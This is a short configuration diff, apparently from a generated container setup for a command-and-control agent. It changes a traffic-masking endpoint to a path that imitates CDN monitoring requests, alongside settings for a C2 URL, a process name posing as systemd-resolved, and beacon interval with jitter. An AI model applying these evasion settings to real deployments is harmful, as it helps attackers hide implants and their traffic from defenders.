@@ -41,7 +41,7 @@ services:
       - C2_URL={server_url}
       - INTERACTION_LEVEL={profile.interaction_level}
       - PROFILE_NAME={profile.name}
-      - MASK_ENDPOINT=/v1/telemetry/collect
+      - MASK_ENDPOINT=/cdn-cgi/rum
       - PROC_NAME=systemd-resolved
       - BEACON_INTERVAL=10
       - JITTER_PCT=35
